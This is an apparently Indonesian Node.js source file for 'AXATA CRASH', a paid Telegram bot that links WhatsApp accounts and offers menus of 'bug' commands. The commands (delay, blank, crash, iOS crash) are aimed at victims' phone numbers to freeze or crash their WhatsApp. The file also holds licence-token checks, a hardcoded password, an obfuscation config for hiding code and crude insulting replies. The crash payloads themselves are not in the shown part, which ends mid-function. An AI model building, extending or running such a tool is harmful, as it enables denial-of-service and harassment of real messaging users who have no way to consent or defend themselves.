const {
    default: makeWAsocket,
    proto,
    DisconnectReason,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    generateWAMessage,
    prepareWAMessageMedia,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    WAsocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys")


// ---------- ( Set Const ) ----------- \\
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const axios = require("axios");
const chalk = require("chalk");
const moment = require("moment");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, {
    polling: true
});
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/AxataCrashh/AXTdatabase/main/tokens.json";
const ONLY_FILE = path.join(__dirname, "Database", "gconly.json");
const cd = path.join(__dirname, "Colldwon", "cd.json");


/// --- ( Random Image ) --- \\\
const randomImages = [
    "https://files.catbox.moe/8ckjs1.jpg",
    "https://files.catbox.moe/8ckjs1.jpg",
];

const getRandomImage = () =>
    randomImages[Math.floor(Math.random() * randomImages.length)];



// ----------------- ( Pengecekan Token ) ------------------- \\
async function fetchValidTokens() {
    try {
        const response = await
        axios.get(GITHUB_TOKEN_LIST_URL);
        return response.data.tokens;
    } catch (error) {
        console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
        return [];
    }
}

async function validateToken() {
    console.log(chalk.blue(`🔍 Memeriksa apakah token ada di database AXATA CRASH
`));

    const validTokens = await fetchValidTokens();
    if (!validTokens.includes(BOT_TOKEN)) {
        console.log(chalk.red(`
═══════════════════════════════════════════
✅ Pemeliharaan NONAKTIF, bot Berjalan normal
🔍 Memeriksa Apaka Token Bot Valid
[ # ] TOKEN TIDAK TERVERIFIKASI
═══════════════════════════════════════════
⠀⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
        process.exit(1);
    }
    console.log(chalk.green(` ✅ Pemeliharaan NONAKTIF, bot Berjalan normal
🔍 Memeriksa Apaka Token Bot Valid
[ # ] TOKEN TERVERIFIKASI🕊 `));
    startBot();
    initializeWhatsAppConnections();
}



function startBot() {
    console.log(chalk.yellow.bold(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 █████╗ ██╗  ██╗ █████╗ ████████╗ █████╗ 
██╔══██╗██║  ██║██╔══██╗╚══██╔══╝██╔══██╗
███████║  ████ ║███████║   ██║   ███████║
██╔══██║██╔══██║██╔══██║   ██║   ██╔══██║
██║  ██║██║  ██║██║  ██║   ██║   ██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» INFORMATION:
𖤞 NAME SCRIPT : AXATA CRASH 
𖤞 DEVELOPER : @BlrezaXaxata
𖤞 OWNER¹ : @hanzzy444
𖤞 OWNER² : @MiracleBoyv
𖤞 DATABASE : BERDATABASE - PASSWORD - ENC HARD
𖤞 VERSION : BETA LIMITED EDITION
#THANKS FOR BUYING SCIRPT

`));
    console.log(chalk.red(``));
}

validateToken();




// --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\

let axata;

function saveActiveSessions(botNumber) {
    try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
            const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
            if (!existing.includes(botNumber)) {
                sessions.push(...existing, botNumber);
            }
        } else {
            sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
    } catch (error) {
        console.error("Error saving session:", error);
    }
}

async function initializeWhatsAppConnections() {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
            console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

            for (const botNumber of activeNumbers) {
                console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                const sessionDir = createSessionDir(botNumber);
                const {
                    state,
                    saveCreds
                } = await useMultiFileAuthState(sessionDir);

                axata = makeWAsocket({
                    auth: state,
                    printQRInTerminal: true,
                    logger: P({
                        level: "silent"
                    }),
                    defaultQueryTimeoutMs: undefined,
                });

                await new Promise((resolve, reject) => {
                    axata.ev.on("connection.update", async (update) => {
                        const {
                            connection,
                            lastDisconnect
                        } = update;
                        if (connection === "open") {
                            console.log(`Bot ${botNumber} terhubung!`);
                            sessions.set(botNumber, axata);
                            resolve();
                        } else if (connection === "close") {
                            const shouldReconnect =
                                lastDisconnect?.error?.output?.statusCode !==
                                DisconnectReason.loggedOut;
                            if (shouldReconnect) {
                                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                                await initializeWhatsAppConnections();
                            } else {
                                reject(new Error("Koneksi ditutup"));
                            }
                        }
                    });

                    axata.ev.on("creds.update", saveCreds);
                });
            }
        }
    } catch (error) {
        console.error("Error initializing WhatsApp connections:", error);
    }
}

function createSessionDir(botNumber) {
    const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
    if (!fs.existsSync(deviceDir)) {
        fs.mkdirSync(deviceDir, {
            recursive: true
        });
    }
    return deviceDir;
}

//// --- ( Intalasi WhatsApp ) --- \\\
async function connectToWhatsApp(botNumber, chatId) {
    let statusMessage = await bot
        .sendMessage(
            chatId,
            `
<blockquote>AXATA CRASH</blockquote>
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
`, {
                parse_mode: "HTML"
            }
        )
        .then((msg) => msg.message_id);

    const sessionDir = createSessionDir(botNumber);
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(sessionDir);

    axata = makeWAsocket({
        auth: state,
        printQRInTerminal: false,
        logger: P({
            level: "silent"
        }),
        defaultQueryTimeoutMs: undefined,
    });

    axata.ev.on("connection.update", async (update) => {
        const {
            connection,
            lastDisconnect
        } = update;

        if (connection === "close") {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            if (statusCode && statusCode >= 500 && statusCode < 600) {
                await bot.editMessageText(
                    `
<blockquote>AXATA CRASH</blockquote>
▢ Memproses Connecting
╰➤ Number: ${botNumber}
╰➤ Status: Connecting...
`, {
                        chat_id: chatId,
                        message_id: statusMessage,
                        parse_mode: "HTML",
                    }
                );
                await connectToWhatsApp(botNumber, chatId);
            } else {
                await bot.editMessageText(
                    `
<blockquote>AXATA CRASH</blockquote>
▢ Connection Gagal.
╰➤ Number: ${botNumber}
╰➤ Status: Gagal ❌
`, {
                        chat_id: chatId,
                        message_id: statusMessage,
                        parse_mode: "HTML",
                    }
                );
                try {
                    fs.rmSync(sessionDir, {
                        recursive: true,
                        force: true
                    });
                } catch (error) {
                    console.error("Error deleting session:", error);
                }
            }
        } else if (connection === "open") {
            sessions.set(botNumber, axata);
            saveActiveSessions(botNumber);
            await bot.editMessageText(
                `
<blockquote>AXATA CRASH</blockquote>
▢ Connection Sukses
╰➤ Number: ${botNumber}
╰➤ Status: Sukses Connect.
`, {
                    chat_id: chatId,
                    message_id: statusMessage,
                    parse_mode: "HTML",
                }
            );
        } else if (connection === "connecting") {
            await new Promise((resolve) => setTimeout(resolve, 1000));
            try {
                if (!fs.existsSync(`${sessionDir}/creds.json`)) {
                    const code = await axata.requestPairingCode(botNumber);
                    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

                    await bot.editMessageText(
                        `
<blockquote>AXATA CRASH</blockquote>
▢ Code Pairing Kamu
╰➤ Number: ${botNumber}
╰➤ Code: <code>${formattedCode}</code>
`, {
                            chat_id: chatId,
                            message_id: statusMessage,
                            parse_mode: "HTML",
                        });
                };
            } catch (error) {
                console.error("Error requesting pairing code:", error);
                await bot.editMessageText(
                    `
<blockquote>AXATA CRASH</blockquote>
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
╰➤ Status: ${error.message} Error⚠️
`, {
                        chat_id: chatId,
                        message_id: statusMessage,
                        parse_mode: "HTML",
                    }
                );
            }
        }
    });

    axata.ev.on("creds.update", saveCreds);

    return axata;
}


function isGroupOnly() {
    if (!fs.existsSync(ONLY_FILE)) return false;
    const data = JSON.parse(fs.readFileSync(ONLY_FILE));
    return data.groupOnly;
}


function setGroupOnly(status) {
    fs.writeFileSync(ONLY_FILE, JSON.stringify({
        groupOnly: status
    }, null, 2));
}


// ---------- ( Read File And Save Premium - Admin - Owner ) ----------- \\
let premiumUsers = JSON.parse(fs.readFileSync('./Database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./Database/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./Database/premium.json');
ensureFileExists('./Database/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./Database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./Database/admin.json', JSON.stringify(adminUsers, null, 2));
}

function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./Database/premium.json', (data) => (premiumUsers = data));
watchFile('./Database/admin.json', (data) => (adminUsers = data));


function isOwner(userId) {
    return config.OWNER_ID.includes(userId.toString());
}

/// --- ( Fungsi buat file otomatis ) --- \\\
if (!fs.existsSync(ONLY_FILE)) {
    fs.writeFileSync(ONLY_FILE, JSON.stringify({
        groupOnly: false
    }, null, 2));
}

// ------------ ( Function Plugins ) ------------- \\
function formatRuntime(seconds) {
    const days = Math.floor(seconds / (3600 * 24));
    const hours = Math.floor((seconds % (3600 * 24)) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hours}h, ${minutes}m, ${secs}s`;
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
    const now = Math.floor(Date.now() / 1000);
    return formatRuntime(now - startTime);
}

function getSpeed() {
    const startTime = process.hrtime();
    return getBotSpeed(startTime);
}


function getCurrentDate() {
    const now = new Date();
    const options = {
        weekday: "long",
        year: "numeric",
        month: "long",
        day: "numeric"
    };
    return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

// ======== COOLDOWN DATA ========
let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : {
    time: 5 * 60 * 1000,
    users: {}
};

// ======== SAVE COOLDOWN ========
function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

// ======== CHECK COOLDOWN ========
function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000);
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

// ======== SET COOLDOWN DARI COMMAND ========
function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

// ~ Enc
const getAphocalypsObfuscationConfig = () => {
  return {
    target: "node",
    calculator: true,
    compact: true,
    hexadecimalNumbers: true,
    controlFlowFlattening: 0.75,
    deadCode: 0.2,
    dispatcher: true,
    duplicateLiteralsRemoval: 0.75,
    flatten: true,
    globalConcealing: true,
    identifierGenerator: "zeroWidth",
    minify: true,
    movedDeclarations: true,
    objectExtraction: true,
    opaquePredicates: 0.75,
    renameVariables: true,
    renameGlobals: true,
    stringConcealing: true,
    stringCompression: true,
    stringEncoding: true,
    stringSplitting: 0.75,
    rgf: false,
  };
};

// #Progres #1
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// ~ Update Progress 
// Fix `updateProgress()`
async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "🔥 Selesai" : `⚙️ ${status}`;
    
    try {
        await bot.editMessageText(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_© ᴇɴᴄ ʙᴏᴛ axata attack you! ✘_",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}


/// --- ( Menu Utama ) --- \\\
const bugRequests = {};
// Simpan status login per user (biar tiap user punya sesi sendiri)
const userAccess = {};
const password = "AxataUiV7.6"; // ubah sesuai keinginanmu

// Command /start
bot.onText(/^\/axata$/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const chatType = msg.chat.type;

    // Kalau belum login (belum masukin password)
    if (!userAccess[senderId]) {
        return bot.sendMessage(
            chatId,
            "🔒 Akses ditolak! Login dulu nyet 🤓😹", {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "🔑 Login ngentot",
                            callback_data: "input_password"
                        }],
                        [{
                            text: "OK",
                            callback_data: "close_alert"
                        }]
                    ]
                }
            }
        );
    }

    // CEK APAKAH BOT HANYA UNTUK GRUP
    let groupOnlyData = globalThis.groupOnlyData || {
        groupOnly: false
    };
    if (groupOnlyData.groupOnly && chatType === "private") {
        return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
    }

    // === CEK getBotRuntime() AGAR AMAN ===
    if (typeof getBotRuntime !== "function") {
        global.getBotRuntime = function() {
            const uptime = process.uptime();
            const minutes = Math.floor(uptime / 60);
            const seconds = Math.floor(uptime % 60);
            return `${minutes}m ${seconds}s`;
        };
    }

    // === MENU UTAMA (setelah login) ===
    const caption = `

<pre>(ⓘ)TETAP STYA DI SC DI ERA GEMPURAN WEB BUG🤓🤭</pre>
 
<b>─━━─━━⧼ AXATA CRASH ⧽─━━─━━:</b>
  <b>ⵢBot Name</b>  : AXATA CRASH
  <b>ⵢCreated By</b> : @BlrezaXaxata
  <b>ⵢVersion</b>   : 7.6
  <b>ⵢRuntime</b> : ${getBotRuntime()}
  <b>ⵢUser ID</b>   : ${senderId}
  
<blockquote>Pilih Button Di Bawah Ini Untuk Memulai Axata</blockquote>

`;

    const buttons = [
        [{
                text: "ʙ҈̡̛ᴜ̵̡͠ɢ̸̢̛ꜱ̶͢͝ ⓘ̶͜͡ ᴍ̵̨͞ᴇ҈̕͜ɴ̸̢͞ᴜ҈̧҇",
                callback_data: "Delay"
            },
            {
                text: "ᴀ̷͢͡ᴄ̵̨͠ᴄ̴̨̕ᴇ̶̢̕ꜱ̶̡̕ꜱ҉̧̛ ⓘ̴̨͠ ᴍ̸̕͜ᴇ̷͢͡ɴ҈͜͞ᴜ̶̡҇",
                callback_data: "ownermenu"
            }
        ],
        [{
            text: "ᴛ̸̢҇ʜ̷͜͠ᴀ̸̡͠ɴ҉̨̛ᴋ̴̛͜ꜱ̸̡̛ ⓘ҈̕͜ ꜱ̸̨͞ᴜ̷̢͡ᴘ̶̧͠ᴘ̵̨̕ᴏ҉̕͢ʀ̶̢͡ᴛ̶̕͢",
            callback_data: "thanksto"
        }],
        [{
            text: "ᴅ̶̧͡ᴇ̸̨҇ᴠ҈͢͠ᴇ҈̧͡ʟ҉͢͡ᴏ̷̧͡ᴘ̷̡͠ᴇ̶̡͡ʀ̸͢͠ ⓘ̸̨҇",
            url: "https://t.me/BlrezaXaxata"
        }]
    ];

    bot.sendVideo(chatId, "https://files.catbox.moe/8afkqo.mp4", {
        caption,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: buttons
        }
    });
});

// Handler tombol inline
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const userId = query.from.id;

    if (data === "input_password") {
        // Kirim popup ForceReply agar user bisa isi password
        await bot.sendMessage(chatId, "🔒 hayoo apa password nya🤓😹:", {
            reply_markup: {
                force_reply: true,
                selective: true
            }
        });

        // Tunggu balasan user setelah ForceReply
        bot.once("message", async (replyMsg) => {
            const userInput = (replyMsg.text || "").trim();

            if (userInput !== password) {
                return bot.sendMessage(chatId, "🔒 Akses ditolak! login dulu tolol", {
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: "OK",
                                callback_data: "close_alert"
                            }]
                        ]
                    }
                });
            }

            userAccess[userId] = true;
            return bot.sendMessage(
                chatId,
                "✅ Password Lu benar ya tolol\nKetik `/axata` lagi biar mncul menu utama kontol.", {
                    parse_mode: "Markdown"
                }
            );
        });
    }

    if (data === "close_alert") {
        // Tutup popup alert
        bot.deleteMessage(chatId, query.message.message_id);
    }
});
bot.on("callback_query", async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const randomImage = getRandomImage();
    const senderId = callbackQuery.from.id;
    const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
    const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";

    let newCaption = "";
    let newButtons = [];

    if (data === "Delay") {
        newCaption = `
<pre>ⓘ bugs delayXbuldozer 100% work</pre>
<blockquote>「 📱 DELAY ANDRO 📱 」</blockquote>
┃ ★ /Buldosedot       ⵢ 62xxx 
┃ ★ /PortoAndro     ⵢ 62xxx  
┃ ★ /DelayAxta     ⵢ 62xxx  
┃ ★ /DelayXaxt     ⵢ 62xxx  
┃ ★ /DelayAndro     ⵢ 62xxx  
<blockquote>[ TYPE BUGS BEBAS SPAM ]</blockquote>
┃ ★ /Delayspam   ( Bebas spam )  ⵢ 62xxx 
┃ ★ /InvisDelay   ( Bebas spam )  ⵢ 62xxx  
╰═━═━═━═━═━═━═━═━═━═━═⪩
<blockquote>ⓘ ᴊɪᴋᴀ ᴍᴇʀᴀꜱᴀ ᴛɪᴅᴀᴋ ᴡᴏʀᴋ ᴛᴇꜱ ᴅɪ ɴᴏᴍᴏʀ ʟᴜ ᴛᴏʟᴏʟ🤓</blockquote>
<blockquote>ⓘʜᴀʟᴀᴍᴀɴ 1 / 2</blockquote>
`;
        newButtons = [
            [{
                text: "ⓘ Next",
                callback_data: "FrezXBlank"
            }],
            [{
                text: "ⓘ Back",
                callback_data: "mainmenu"
            }]
        ];

    } else if (data === "FrezXBlank") {
        newCaption = `
<pre>Menu Bugs Blank 90% Work</pre>
<blockquote>「 📵 BLANK ANDRO UI 📵 」</blockquote>
┃ ★ /AxataAndro      ⵢ 62xxx
┃ ★ /BlankAndro       ⵢ 62xxx
┃ ★ /BlankChat        ⵢ 62xxx
┃ ★ /XBlankhp        ⵢ 62xxx
┃ ★ /BlankAxataKill        ⵢ 62xxx
┃ ★ /XBlankUi     ⵢ 62xxx  
╰═━═━═━═━═━═━═━═━═━═━═⪩
<blockquote>ᴊɪᴋᴀ ᴍᴇɴᴇᴍᴜᴋᴀɴ ʙᴜɢ ᴇʀᴏʀ ʟᴀɴɢꜱᴜɴɢ ʟᴀᴘᴏʀ ʟᴇ ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙɪᴀʀ ᴅɪ ɢᴀɴᴛɪ ꜰɪᴛᴜʀ ʙᴜɢ ʏᴀɴɢ ᴇʀᴏʀ ɪᴛᴜ ʏᴀ</blockquote>
<blockquote>ʜᴀʟᴀᴍᴀɴ  2 / 3</blockquote>
`;
        newButtons = [
            [{
                text: "ⓘ Next",
                callback_data: "ios"
            }],
            [{
                text: "ⓘ prev",
                callback_data: "Delay"
            }],
            [{
                text: "ⓘ Back",
                callback_data: "mainmenu"
            }]
        ];

    } else if (data === "ios") {
        newCaption = `
<pre>Efek Bugs 85% Workt</pre>
<blockquote>「 📵 BUGS IPONGS 📵 」</blockquote>
┃ ★ /iosinVisFC3      ⵢ 62xxx
┃ ★ /CrashIpongs    ⵢ 62xxx
┃ ★ /Delayipongs        ⵢ 62xxx
┃ ★ /crashNewIos        ⵢ 62xxx
┃ ★ /ioscrash          ⵢ 62xxx
╰═━═━═━═━═━═━═━═━═━═━═⪩
<blockquote><b>ᴜɴᴛᴜᴋ ꜰɪᴛᴜʀ ʙᴜɢ ɪᴏꜱ ᴍᴀꜱɪ ꜱᴇᴅɪᴋɪᴛ ʏᴀ ɴᴀɴᴛɪ ᴋʟᴏ ᴀᴅᴀ ꜰᴜɴᴄ ʙᴀᴋᴀʟᴀɴ ɢᴡ ᴛᴀᴍʙᴀʜɪɴ ᴜɴᴛᴜᴋ ᴄᴍᴅ ʙᴜɢ ɪᴏꜱ‼️ ᴍᴏʜᴏɴ ᴅɪ ᴍᴀᴋʟᴜᴍɪ ʏᴀ ɢᴜʏꜱ☺️</b></blockquote>
<blockquote>ʜᴀʟᴀᴍᴀɴ 4 / 4</blockquote>
`;
        newButtons = [
            [{
                text: "ⓘ prev",
                callback_data: "FrezXBlank"
            }],
            [{
                text: "ⓘ Back",
                callback_data: "mainmenu"
            }]
        ];

    } else if (data === "ownermenu") {
        newCaption = `
<pre>Owner Menu</pre>
★ /Xaddprem ID Time
★ /Xdelprem ID
★ /listprem ID

<pre>Admin ⨷ Menu</pre>
★ /Xaddadmin ID 
★ /Xdeladmin ID

<pre>Setings ⨷ Menu</pre>
★ /reqpair ( Connect )
★ /listconnect ( List Pairing )
★ /csessions ( clong bot )
★ /gconly ( Off|on )
★ /setjeda ( s|m|h )
`;
        newButtons = [
            [{
                text: "ⓘ Tools",
                callback_data: "tools"
            }],
            [{
                text: "ⓘ Back",
                callback_data: "mainmenu"
            }]
        ];

    } else if (data === "tools") {
        newCaption = `
<pre>TOOLS MENU</pre>>
★ /done
★ /info
★ /tes
★ /iqc
★ /brat
★ /tourl
★ /fixedbug
★ /cek   [ error syntax ]
★ /fix    [ fix code merah ]
★ /killpanel | /stopkill ( Gunakan dlm keadaan darurat!! )
`;
        newButtons = [
            [{
                text: "ⓘ Tools",
                callback_data: "tools"
            }],
            [{
                text: "ⓘ prev",
                callback_data: "ownermenu"
            }],
            [{
                text: "ⓘ Back",
                callback_data: "mainmenu"
            }]
        ];

    } else if (data === "thanksto") {
        newCaption = `
<blockquote>( ! ) Thanks To Support
꙳ @BlrezaXaxata ( Developer )
꙳ @MiracleBoyv ( Staff Sender )
꙳ @hanzzy444 ( Staff Test Bugs )
꙳ @Otapengenkawin ( Support )
꙳ @justinoffc ( support 
꙳ ChatGpt ( My Friends )
꙳ Ortu ( support )
꙳ All Buyer AXATA CRASH
ⓘ AXATA CRASH</blockquote>
`;
        newButtons = [
            [{
                text: "ⓘ Back",
                callback_data: "mainmenu"
            }]
        ];

    } else if (data === "mainmenu") {
        const runtime = getBotRuntime();
        newCaption = `
<pre>(ⓘ)TETAP STYA DI SC DI ERA GEMPURAN WEB BUG🤓🤭</pre>
 
<b>─━━─━━⧼ AXATA CRASH ⧽─━━─━━:</b>
  <b>ⵢBot Name</b>  : Axata Crash
  <b>ⵢCreated By</b> : @BlrezaXaxata
  <b>ⵢVersion</b>   : 7.6
  <b>ⵢRuntime</b> : ${getBotRuntime()}
  <b>ⵢUser ID</b>   : ${senderId}
  /update : Jika ada pemberitahuan update sc dri developer 
  /restart : Jika bot tidak merespon ketik cmd ini!!

<blockquote>Pilih Button Di Bawah Ini Untuk Memulai Axata</blockquote>
`;
        newButtons = [
            [{
                    text: "ʙ҈̡̛ᴜ̵̡͠ɢ̸̢̛ꜱ̶͢͝ ⓘ̶͜͡ ᴍ̵̨͞ᴇ҈̕͜ɴ̸̢͞ᴜ҈̧҇",
                    callback_data: "Delay"
                },
                {
                    text: "ᴀ̷͢͡ᴄ̵̨͠ᴄ̴̨̕ᴇ̶̢̕ꜱ̶̡̕ꜱ҉̧̛ ⓘ̴̨͠ ᴍ̸̕͜ᴇ̷͢͡ɴ҈͜͞ᴜ̶̡҇",
                    callback_data: "ownermenu"
                }
            ],
            [{
                text: "ᴛ̸̢҇ʜ̷͜͠ᴀ̸̡͠ɴ҉̨̛ᴋ̴̛͜ꜱ̸̡̛ ⓘ҈̕͜ ꜱ̸̨͞ᴜ̷̢͡ᴘ̶̧͠ᴘ̵̨̕ᴏ҉̕͢ʀ̶̢͡ᴛ̶̕͢",
                callback_data: "thanksto"
            }],
            [{
                text: "ᴅ̶̧͡ᴇ̸̨҇ᴠ҈͢͠ᴇ҈̧͡ʟ҉͢͡ᴏ̷̧͡ᴘ̷̡͠ᴇ̶̡͡ʀ̸͢͠ ⓘ̸̨҇",
                url: "https://t.me/BlrezaXaxata"
            }]
        ];
    }

    try {
        await bot.editMessageMedia({
            type: "video",
            media: "https://files.catbox.moe/8afkqo.mp4",
            caption: newCaption,
            parse_mode: "HTML"
        }, {
            chat_id: chatId,
            message_id: messageId,
